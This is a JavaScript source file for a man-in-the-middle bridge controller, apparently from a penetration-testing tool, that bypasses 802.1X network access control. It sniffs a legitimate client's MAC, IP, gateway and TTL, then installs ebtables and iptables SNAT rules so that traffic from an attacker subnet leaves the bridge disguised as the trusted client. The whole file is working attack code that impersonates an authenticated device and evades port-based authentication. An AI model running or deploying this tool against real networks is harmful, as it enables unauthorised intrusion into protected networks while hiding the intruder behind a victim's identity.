const EventEmitter = require('events')
const fs = require('fs')
const interfaces = require('os').networkInterfaces()

var full_log = fs.createWriteStream(__dirname + '/logs/history.log', {flags : 'a'})
var current_log = fs.createWriteStream(__dirname + '/logs/current.log', {flags : 'w'})

//custom class to track network information based on sniffed packets
const NetInfo = require('./net_info.js')

const { execSync } = require("child_process")

//os cmd helper function
function os_cmd(comment, cmd){
  console.log(`INFO: ${comment}`)
  console.log(`COMMAND: ${cmd}`)
  full_log.write(`INFO: ${comment}\n`)
  full_log.write(`COMMAND: ${cmd}\n`)
  current_log.write(`INFO: ${comment}\n`)
  current_log.write(`COMMAND: ${cmd}\n`)
  let output = execSync(cmd, {"timeout": 10000}).toString()
  if(output.length > 0){
     console.log(`OUTPUT: ${output}`)
     full_log.write(`OUTPUT: ${output}\n`)
     current_log.write(`OUTPUT: ${output}\n`)
  }
  return output
}

//custom class to manage the bridge interface, set iptables/ebtables/arptables rules, and update system network info
class BridgeControllerAdapted extends EventEmitter {
  constructor(config) {
    super()
    // Configurable parameters for MitM bridge
    this.mitm_bridge_name = config.mitm_bridge_name || "dolos_bridge";
    this.mitm_bridge_apipa_subnet = config.mitm_bridge_apipa_subnet || '169.254.0.0/16'; // For the bridge's own IP
    this.mitm_bridge_apipa_ip = config.mitm_bridge_apipa_ip || '169.254.66.77';         // Bridge's own IP
    this.mitm_bridge_mac = config.mitm_bridge_mac || '00:01:01:01:01:01';             // Bridge's own MAC

    // Interfaces for MitM bridge
    this.mitm_nic1 = config.mitm_switch_if;       // e.g., lan0 (to 802.1x switch)
    this.mitm_nic2 = config.mitm_supplicant_if; // e.g., lan1 (to trusted supplicant)

    // Subnet for attacker machines (e.g., "172.16.100.0/24")
    this.attacker_bridge_subnet = config.attacker_bridge_subnet;

    // Other existing config parameters
    this.ephemeral_ports = config.ephemeral_ports || '61000-62000';
    this.virtual_gateway_ip = config.virtual_gateway_ip || '169.254.66.55'; // Used for routing through MitM
    this.replace_default_route = config.replace_default_route;
    this.run_command_on_success = config.run_command_on_success;
    this.autorun_command = config.autorun_command;
    this.use_network_manager = config.use_network_manager !== undefined ? config.use_network_manager : false;


    this.gateway_side_interface = ''; // Determined dynamically
    this.client_side_interface = '';  // Determined dynamically
    this.int_to_mac = {};
    if (this.mitm_nic1) {
        try {
            this.int_to_mac[this.mitm_nic1] = execSync(`cat /sys/class/net/${this.mitm_nic1}/address`, {"timeout": 10000}).toString().trim();
        } catch (e) {
            console.error(`Error getting MAC for ${this.mitm_nic1}: ${e.message}`);
            full_log.write(`Error getting MAC for ${this.mitm_nic1}: ${e.message}\n`);
            current_log.write(`Error getting MAC for ${this.mitm_nic1}: ${e.message}\n`);
        }
    }
    if (this.mitm_nic2) {
        try {
            this.int_to_mac[this.mitm_nic2] = execSync(`cat /sys/class/net/${this.mitm_nic2}/address`, {"timeout": 10000}).toString().trim();
        } catch (e) {
            console.error(`Error getting MAC for ${this.mitm_nic2}: ${e.message}`);
            full_log.write(`Error getting MAC for ${this.mitm_nic2}: ${e.message}\n`);
            current_log.write(`Error getting MAC for ${this.mitm_nic2}: ${e.message}\n`);
        }
    }
  }

  //I don't love this method. But it seems consistent and ebtables postrouting rules based on source mac seem to work better than other attempts at NATing based on destination
  get_int_for_smac(mac_addr){
     let if_number = execSync(`brctl showmacs ${this.mitm_bridge_name}| grep ${mac_addr} | awk '{print $1}'`, {"timeout": 10000}).toString().trim()
     let interface_name = execSync(`brctl showstp ${this.mitm_bridge_name} | grep '(${if_number})' | head -n1 | awk '{print $1}'`, {"timeout": 10000}).toString().trim()
     return interface_name
  }

  start_mitm_operations(){ // Renamed from start_bridge
    os_cmd('Load arptable_filter kernel module', `modprobe arptable_filter || true`)
    os_cmd('Load br_netfilter kernel module', `modprobe br_netfilter || true`)

    // Set default OUTPUT policies to DROP
    // The dolos_run.sh script will handle IP forwarding, so BPI-R3 can still route if needed.
    // These rules prevent the BPI-R3 from initiating traffic from its MitM bridge IPs/MACs directly.
    os_cmd('Use "policy" to allow loopback traffic', `iptables -A OUTPUT -o lo -j ACCEPT`)
    os_cmd('Use "policy" to drop all outbound IP traffic from this device by default', `iptables -P OUTPUT DROP`)
    os_cmd('Use "policy" to drop all outbound Ethernet traffic from this device by default', `ebtables -P OUTPUT DROP`)
    os_cmd('Use "policy" to drop all outbound ARP traffic from this device by default', `arptables -P OUTPUT DROP`)

    // Allow traffic on interfaces not involved in MitM (e.g., management interface 'wan')
    // This list of interfaces is from the perspective of the Node.js script.
    // The actual management interface (e.g. "wan") should be passed in or determined.
    // For now, this logic might need refinement if 'interfaces' is not correctly populated or scoped.
    // A safer approach is to explicitly allow traffic on the known management interface.
    // Example: os_cmd('Allow OUTPUT on management_if', `iptables -A OUTPUT -o ${this.config.mgmt_if} -j ACCEPT`)
    // For simplicity, we'll keep the original loop but note its dependency on 'interfaces' variable.
    for(const iface in interfaces){
      // Exclude MitM bridge and its physical member interfaces from this explicit ACCEPT rule.
      // Traffic for these will be handled by specific SNAT rules or allowed if originating from attacker_bridge.
      if(![this.mitm_bridge_name, this.mitm_nic1, this.mitm_nic2].includes(iface)){
        os_cmd(`Allow OUTPUT on non-MitM interface: ${iface}`, `ebtables -A OUTPUT -o ${iface} -j ACCEPT`)
        os_cmd(`Allow OUTPUT on non-MitM interface: ${iface}`, `iptables -A OUTPUT -o ${iface} -j ACCEPT`)
        os_cmd(`Allow OUTPUT on non-MitM interface: ${iface}`, `arptables -A OUTPUT -o ${iface} -j ACCEPT`)
      }
    }

    // Granular blocks for specific EtherTypes on OUTPUT (preventing BPI-R3 from sending these itself)
    os_cmd('Additional granular block on other ARP types (OUTPUT)', `ebtables -A OUTPUT -p 0x0806 -j DROP`)
    os_cmd('Additional granular block on other ARP types (OUTPUT)', `ebtables -A OUTPUT -p 0x0808 -j DROP`)
    os_cmd('Additional granular block on other ARP types (OUTPUT)', `ebtables -A OUTPUT -p 0x8035 -j DROP`)
    os_cmd('Additional granular block on other ARP types (OUTPUT)', `ebtables -A OUTPUT -p 0x80F3 -j DROP`)

    if (this.use_network_manager) {
        if (this.mitm_nic1) os_cmd(`Stop NetworkManager from managing ${this.mitm_nic1}`, `nmcli d set ${this.mitm_nic1} managed no || true`);
        if (this.mitm_nic2) os_cmd(`Stop NetworkManager from managing ${this.mitm_nic2}`, `nmcli d set ${this.mitm_nic2} managed no || true`);
    }

    // IPv6 settings for MitM bridge and interfaces (assuming bridge and NICs are already up and configured by dolos_run.sh)
    if (this.mitm_bridge_name) {
        os_cmd(`Disable IPv6 autoconf on ${this.mitm_bridge_name}`, `sysctl -w net.ipv6.conf.${this.mitm_bridge_name}.autoconf=0 || true`);
        os_cmd(`Ignore IPv6 router advertisements on ${this.mitm_bridge_name}`, `sysctl -w net.ipv6.conf.${this.mitm_bridge_name}.accept_ra=0 || true`);
    }
    if (this.mitm_nic1) {
        os_cmd(`Disable IPv6 autoconf on ${this.mitm_nic1}`, `sysctl -w net.ipv6.conf.${this.mitm_nic1}.autoconf=0 || true`);
        os_cmd(`Ignore IPv6 router advertisements on ${this.mitm_nic1}`, `sysctl -w net.ipv6.conf.${this.mitm_nic1}.accept_ra=0 || true`);
    }
    if (this.mitm_nic2) {
        os_cmd(`Disable IPv6 autoconf on ${this.mitm_nic2}`, `sysctl -w net.ipv6.conf.${this.mitm_nic2}.autoconf=0 || true`);
        os_cmd(`Ignore IPv6 router advertisements on ${this.mitm_nic2}`, `sysctl -w net.ipv6.conf.${this.mitm_nic2}.accept_ra=0 || true`);
    }
    
    // Bridge creation, IP/MAC assignment, and bringing interfaces up are handled by dolos_run.sh

    if (this.replace_default_route) {
      let dr = os_cmd('Get default route in case we need to delete it', `ip route |grep default |head -n1`);
      if (dr.length > 0) {
        try {
          os_cmd('Delete default route', `ip route delete ${dr.trim()} >/dev/null 2>&1 || true`);
        } catch (err) {
          console.log(`Error deleting default route: ${err.message}`);
        }
      }
    }

    // Allow EAPOL (802.1x) packets to traverse the MitM bridge
    try {
      os_cmd(`Allow EAPOL on ${this.mitm_bridge_name}`, `echo 8 > /sys/class/net/${this.mitm_bridge_name}/bridge/group_fwd_mask`);
    } catch (e) {
        console.error(`Failed to set group_fwd_mask for ${this.mitm_bridge_name}: ${e.message}`);
        // This is critical for 802.1x bypass.
    }


    var self = this; // Use 'self' for clarity in callbacks
    this.net_info = new NetInfo(this.mitm_bridge_name); // Sniff on the MitM bridge

    this.net_info.on('new_arp', function(arp_info) {
      self.emit('bridge_update', {type: 'new_arp', data: arp_info});
      self.new_arp(arp_info);
    });
    this.net_info.on('dns_update', function(dns_servers) {
      self.emit('bridge_update', {type: 'dns_update', data: dns_servers});
      self.update_dns(dns_servers);
    });
    this.net_info.once('client_ip_mac_and_gateway_mac', function(info) {
      self.emit('bridge_update', {type: 'cimagm', data: info});
      self.spoof_client_to_gateway(info);
    });
    this.net_info.once('gateway_ip_mac_and_client_mac', function(info) {
      self.emit('bridge_update', {type: 'gimacm', data: info});
      self.spoof_gateway_to_client(info);
    });
    this.net_info.once('client_ttl', function(info) {
      self.emit('bridge_update', {type: 'client_ttl', data: info});
      self.modify_ttl(info);
    });

    this.emit('mitm_operations_up', this.mitm_bridge_name); // Renamed event
  }

  allow_internet_traffic(){ // This method might need re-evaluation based on routing setup by dolos_run.sh
    try{
      os_cmd('Clear any existing default route (allow_internet_traffic)',`ip route del default || true`)
    }catch(err){
      console.log(err)
    }
    // This adds default route via virtual_gateway_ip on the MitM bridge.
    // Ensure this is desired alongside dolos_run.sh routing.
    os_cmd('Add MitM bridge as a default route to allow Internet access',`ip route add default via ${this.virtual_gateway_ip} dev ${this.mitm_bridge_name}`)
  }

  cleanup_rules() { // New method to only flush rules
    os_cmd('Flushing ebtables policies and rules',`ebtables -F && ebtables -t filter -F && ebtables -t nat -F`);
    os_cmd('Flushing iptables policies and rules',`iptables -F && iptables -t filter -F && iptables -t nat -F && iptables -t mangle -F && iptables -t raw -F`);
    os_cmd('Flushing arptables policies and rules', `arptables -F`); // Added arptables flush

    // Reset default policies to ACCEPT to restore normal connectivity
    os_cmd('Reset iptables OUTPUT policy to ACCEPT', `iptables -P OUTPUT ACCEPT`);
    os_cmd('Reset ebtables OUTPUT policy to ACCEPT', `ebtables -P OUTPUT ACCEPT`);
    os_cmd('Reset arptables OUTPUT policy to ACCEPT', `arptables -P OUTPUT ACCEPT`);


    // Re-allow traffic on non-MitM interfaces (idempotent due to -F above, but good for clarity)
    // This loop might be redundant if policies are set to ACCEPT.
    // However, it ensures specific ACCEPT rules if other default policies were different.
    for(const iface in interfaces){
      if(![this.mitm_bridge_name, this.mitm_nic1, this.mitm_nic2].includes(iface)){
        os_cmd(`Ensure OUTPUT allowed on non-MitM interface: ${iface}`, `ebtables -A OUTPUT -o ${iface} -j ACCEPT || true`);
        os_cmd(`Ensure OUTPUT allowed on non-MitM interface: ${iface}`, `iptables -A OUTPUT -o ${iface} -j ACCEPT || true`);
        os_cmd(`Ensure OUTPUT allowed on non-MitM interface: ${iface}`, `arptables -A OUTPUT -o ${iface} -j ACCEPT || true`);
      }
    }
  }

  flush_tables(shutdown){ // Now calls cleanup_rules and cleanup_rules_and_exit
    this.cleanup_rules();
    this.cleanup_rules_and_exit(shutdown);
  }
  
  cleanup_rules_and_exit(shutdown){ // Renamed from stop_bridge
    if(shutdown){
      // Bridge and NIC management is now handled by dolos_run.sh
      // This method, when called with shutdown=true, will only exit the Node.js process.
      // The actual network cleanup is done by dolos_run.sh's trap.
      if (this.use_network_manager) {
        if (this.mitm_nic1) os_cmd(`Attempt to set ${this.mitm_nic1} to managed by NetworkManager`, `nmcli d set ${this.mitm_nic1} managed yes || true`);
        if (this.mitm_nic2) os_cmd(`Attempt to set ${this.mitm_nic2} to managed by NetworkManager`, `nmcli d set ${this.mitm_nic2} managed yes || true`);
      }
      log('Node.js BridgeControllerAdapted exiting process.');
      process.exit();
    }
  }

  modify_ttl(info){
    os_cmd('Spoof client TTL',`iptables -t mangle -A POSTROUTING -o ${this.mitm_bridge_name} -j TTL --ttl-set ${info.client_ttl}`)
  }

  spoof_client_to_gateway(info){
    //get the interface that is facing the network
    this.gateway_side_interface = this.get_int_for_smac(info.gateway_mac)
    os_cmd('Tag all communication leaving the bridge towards the switch with the client\'s MAC address',
      `ebtables -t nat -A POSTROUTING -s ${this.int_to_mac[this.gateway_side_interface]} -o ${this.gateway_side_interface} -j snat --snat-arp --to-src ${info.client_mac}`)
    //I've been burned by my bridge's mac before :(
    os_cmd('Catch any traffic that might not be caught in the normal POSTROUTING chain',
      `ebtables -t nat -A POSTROUTING -s ${this.mitm_bridge_mac} -o ${this.gateway_side_interface} -j snat --snat-arp --to-src ${info.client_mac}`)
    //Mask TCP Traffic
    os_cmd('Tag all traffic leaving the attacker subnet towards the switch with the client\'s IP and NAT using ephemeral ports for tcp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -p tcp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag all traffic leaving the MitM bridge (from its APIPA IP) towards the switch with the client\'s IP and NAT for tcp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -p tcp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    //Mask UDP Traffic
    os_cmd('Tag all traffic leaving the attacker subnet towards the switch with the client\'s IP and NAT for udp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -p udp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag all traffic leaving the MitM bridge (from its APIPA IP) towards the switch with the client\'s IP and NAT for udp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -p udp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    //Mask iCMP Traffic
    os_cmd('Tag all traffic leaving the attacker subnet towards the switch with the client\'s IP for icmp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -p icmp -j SNAT --to ${info.client_ip}`)
    os_cmd('Tag all traffic leaving the MitM bridge (from its APIPA IP) towards the switch with the client\'s IP for icmp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -p icmp -j SNAT --to ${info.client_ip}`)

//    os_cmd('Tag all traffic from the bridge not destined for the client with the client\'s mac',
//      `ebtables -t nat -A POSTROUTING -s ${this.mitm_bridge_mac} ! -d ${info.client_mac} -j snat --snat-arp --to-source ${info.client_mac}`)
//    os_cmd('Tag all tcp traffic from the bridge not destined for the client with the client\'s ip',
//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mitm_bridge_apipa_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
//    os_cmd('Tag udp tcp traffic from the bridge not destined for the client with the client\'s ip',
//      `iptables -t nat -A POSTROUTING -p udp -s ${this.mitm_bridge_apipa_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
//    os_cmd('Tag icmp tcp traffic from the bridge not destined for the client with the client\'s ip',
//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mitm_bridge_apipa_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
//    os_cmd('Drop all inbound DHCP requests from our attacker subnet', `iptables -t filter -I FORWARD -p udp -s ${this.attacker_bridge_subnet} --dport 67 -j DROP`)
    //we don't need to know the gateway's real IP to use it ;)
    os_cmd('Create a fake arp neighbor with an IP on our MitM bridge that maps to the same mac as the real gateway',
      `ip neigh add ${this.virtual_gateway_ip} lladdr ${info.gateway_mac} dev ${this.mitm_bridge_name}`)
    if(this.replace_default_route){
      os_cmd('Add our virtual gateway as our default gateway',`ip route add default via ${this.virtual_gateway_ip} dev ${this.mitm_bridge_name}`)
    }else{
      let private_ranges = [
        '10.0.0.0/8',
        '192.168.0.0/16',
        '172.16.0.0/12', // Corrected to /12 to cover the whole 172.16-172.31 range
        // The original list had some overlaps and non-standard CIDRs for private ranges.
        // This simplified list covers the main private blocks.
        // '172.16.0.0/13', // These were more granular than needed if /12 is used
        // '172.24.0.0/14',
        // '172.28.0.0/15',
        // '172.30.0.0/16',
        // '172.31.0.0/17',
        // '172.31.128.0/18',
        // '172.31.192.0/19',
        // '172.31.224.0/20',
        // '172.31.240.0/21',
        // '172.31.248.0/22',
        // '172.31.252.0/23',
        // '172.31.254.0/24'
      ]
      let virt_gw_ip = this.virtual_gateway_ip
      let mitm_bridge_name_local = this.mitm_bridge_name // Use local var for forEach scope
      private_ranges.forEach(function(range){
        os_cmd(`Add route to the private range ${range}`,`ip route add ${range} via ${virt_gw_ip} dev ${mitm_bridge_name_local}`)
      })
    }
    // IP forwarding is enabled by dolos_run.sh
    // os_cmd('Allow ip forwarding so we can route from our management interface to the bridge',
    //  `echo 1 > /proc/sys/net/ipv4/ip_forward`)

//    os_cmd('Add attacker subnet to spoof rules for tcp',
//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.attacker_bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
//    os_cmd('Add attacker subnet to spoof rules for udp',
//      `iptables -t nat -A POSTROUTING -p udp -s ${this.attacker_bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
//    os_cmd('Add attacker subnet to spoof rules for icmp',
//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.attacker_bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
     os_cmd('Open up OUTPUT communication from BPI-R3 towards the switch via the identified gateway-side interface of MitM bridge',
      `ebtables -A OUTPUT -o ${this.gateway_side_interface} -j ACCEPT`)
     os_cmd('Allow traffic originating from BPI-R3 (MitM bridge APIPA IP) to leave on the MitM bridge interface',
      `iptables -A OUTPUT -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_ip} -j ACCEPT`)
    //run a single command once we have network access
    if(this.run_command_on_success){
      os_cmd('Autorun command configured. Running:', this.autorun_command)
    }
  }

  spoof_gateway_to_client(info){
    this.client_side_interface = this.get_int_for_smac(info.client_mac)
    os_cmd('Tag all communication from the MitM bridge towards the client with the switch\'s MAC address',
    `ebtables -t nat -A POSTROUTING -s ${this.int_to_mac[this.client_side_interface]} -o ${this.client_side_interface} -j snat --snat-arp --to-src ${info.gateway_mac}`)
    //Mask TCP
    os_cmd('Tag all communication from the MitM bridge (APIPA) towards the client with the gateway\'s IP address and NAT for tcp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag all communication from the attacker subnet towards the client with the gateway\'s IP address and NAT for tcp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    //Mask UDP
    os_cmd('Tag all communication from the MitM bridge (APIPA) towards the client with the gateway\'s IP address and NAT for udp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag all communication from the attacker subnet towards the client with the gateway\'s IP address and NAT for udp', // Corrected -p udp
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    //Mask ICMP
    os_cmd('Tag all communication from the MitM bridge (APIPA) towards the client with the gateway\'s IP address for icmp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
    os_cmd('Tag all communication from the attacker subnet towards the client with the gateway\'s IP address for icmp',
      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
    os_cmd('Open up OUTPUT communication from BPI-R3 towards the client via the identified client-side interface of MitM bridge',
      `ebtables -A OUTPUT -o ${this.client_side_interface} -j ACCEPT`)

//    os_cmd('Tag all traffic from the bridge to the client with the gateway\'s mac',
//      `ebtables -t nat -A POSTROUTING -s ${this.mitm_bridge_mac} -d ${info.client_mac} -j snat --to-source ${info.gateway_mac}`)
//    os_cmd('Tag all tcp traffic from the bridge to the client with the gateway\'s ip',
//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
//    os_cmd('Tag all udp traffic from the bridge to the client with the gateway\'s ip',
//      `iptables -t nat -A POSTROUTING -p udp -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
//    os_cmd('Tag all icmp traffic from the bridge to the client with the gateway\'s ip',
//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
//    os_cmd('Add attacker subnet to spoof rules for client connections over tcp',
//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
//    os_cmd('Add attacker subnet to spoof rules for client connections over udp',
//      `iptables -t nat -A POSTROUTING -p udp -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
//    os_cmd('Add attacker subnet to spoof rules for client connections over icmp',
//       `iptables -t nat -A POSTROUTING -p icmp -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
  }

  send_dhcp_probe(){
    if((this.net_info.client_ip != '') && (this.net_info.client_mac != '')){
      // Ensure the discovery tool path is correct or configurable
      os_cmd('Send DCHP Probe While Spoofing the Client', `/root/tools/dolosjs/discovery ${this.mitm_bridge_name} ${this.net_info.client_mac} ${this.net_info.client_ip}`)
    }
  }

  update_dns(dns_servers){
    console.log(dns_servers)
    os_cmd('Clear dns settings', `> /etc/resolv.conf`)
    dns_servers.forEach(function(server){
      os_cmd('Add DNS Server', `echo nameserver ${server}>> /etc/resolv.conf`)
    })
  }

  new_arp(arp_info){
    console.log(arp_info)
    os_cmd('Update arp entries for new neighbor',`ip neigh add ${arp_info.ip} lladdr ${arp_info.mac} dev ${this.mitm_bridge_name}`)
    os_cmd('Update routes for new neighbor',`ip route add ${arp_info.ip}/32 dev ${this.mitm_bridge_name}`)
  }
}

module.exports = BridgeControllerAdapted
